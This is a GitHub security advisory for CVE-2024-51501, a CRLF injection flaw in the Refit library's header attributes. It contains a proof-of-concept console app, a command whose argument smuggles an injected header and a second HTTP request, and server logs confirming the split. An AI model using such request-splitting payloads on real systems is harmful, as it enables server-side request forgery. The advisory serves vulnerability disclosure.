# [C] CRLF injection in Refit's [Header], [HeaderCollection] and [Authorize] attributes 

## Summary
Severity: Critical
Advisory: GHSA-3hxg-fxwm-8gf7
CVE: CVE-2024-51501
CWE: CWE-93
Ecosystem: NuGet
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H (CVSS_V3)
Published: 2024-11-04
Source: https://github.com/advisories/GHSA-3hxg-fxwm-8gf7
Type: github-advisory

## Affected
- NuGet: `Refit` — affected >=0 <7.2.22

## Details
### Summary
The various header-related Refit attributes (Header, HeaderCollection and Authorize) are vulnerable to CRLF injection.

### Details
The way HTTP headers are added to a request is via the `HttpHeaders.TryAddWithoutValidation` method: <https://github.com/reactiveui/refit/blob/258a771f44417c6e48e103ac921fe4786f3c2a1e/Refit/RequestBuilderImplementation.cs#L1328>
This method does not check for CRLF characters in the header value.

This means that any headers added to a refit request are vulnerable to CRLF-injection. In general, CRLF-injection into a HTTP header (when using HTTP/1.1) means that one can inject additional HTTP headers or smuggle whole HTTP requests.

### PoC
The below example code creates a console app that takes one command line variable (a bearer token) and then makes a request to some status page with the provided token inserted in the "Authorization" header:

```c#
using Refit;

internal class Program
{
    private static void Main(string[] args)
    {
        // Usage: dotnet run <bearer token> 
        string token = args[0];
        var service = RestService.For<IStatusApi>("http://insert.some.site.here");
        string response = service.GetStatus(token).Result;
        Console.WriteLine($"Response: {response}");
    }

    public interface IStatusApi
    {
        [Get("/status")]
        Task<string> GetStatus([Authorize("Bearer")] string token);
    }
}
```

This application is now vulnerable to CRLF-injection, and can thus be abused to for example perform request splitting and thus server side request forgery (SSRF):

```bash
anonymous@ubuntu-sofia-672448:~$ dotnet Refit-cli.dll $'test\r\nUser-Agent: injected header!\r\n\r\nGET /smuggled HTTP/1.1\r\nHost: insert.some.site.here'
Response: <html></html>
```

The application intends to send a single request of the form:
```http
GET /status HTTP/1.1
Host: insert.some.site.here
Authorization: Bearer <bearer token>
```
But as the application is vulnerable to CRLF injection the above command will instead result in the following two requests being sent:
```http
GET /status HTTP/1.1
Host: insert.some.site.here
Authorization: Bearer test
User-Agent: injected header!
```
and
```http
GET /smuggled HTTP/1.1
Host: insert.some.site.here
```

This can be confirmed by checking the access logs on the server where these commands were run (with `insert.some.site.here` pointing to localhost):
```bash
anonymous@ubuntu-sofia-672448:~$ sudo tail /var/log/apache2/access.log
127.0.0.1 - - [29/Aug/2024:12:17:34 +0000] "GET /status HTTP/1.1" 200 240 "-" "injected header!"
127.0.0.1 - - [29/Aug/2024:12:17:34 +0000] "GET /smuggled HTTP/1.1" 404 436 "-" "-"
```

### Impact
If an application using the Refit library passes a user-controllable value through to a header, then that application becomes vulnerable to CRLF-injection. This is not necessarily a security issue for a command line application like the one above, but if such code were present in a web application then it becomes vulnerable to request splitting (as shown in the PoC) and thus Server Side Request Forgery.

Strictly speaking this is a potential vulnerability in applications using Refit, not in Refit itself, but I would argue that at the very least there needs to be a warning about this behaviour in the Refit documentation.

## References
- https://github.com/reactiveui/refit/security/advisories/GHSA-3hxg-fxwm-8gf7
- https://nvd.nist.gov/vuln/detail/CVE-2024-51501
- https://github.com/reactiveui/refit/commit/483b1d8df18098f137ca0eca056b7e9ec19f70dd
- https://github.com/reactiveui/refit
- https://github.com/reactiveui/refit/blob/258a771f44417c6e48e103ac921fe4786f3c2a1e/Refit/RequestBuilderImplementation.cs#L1328
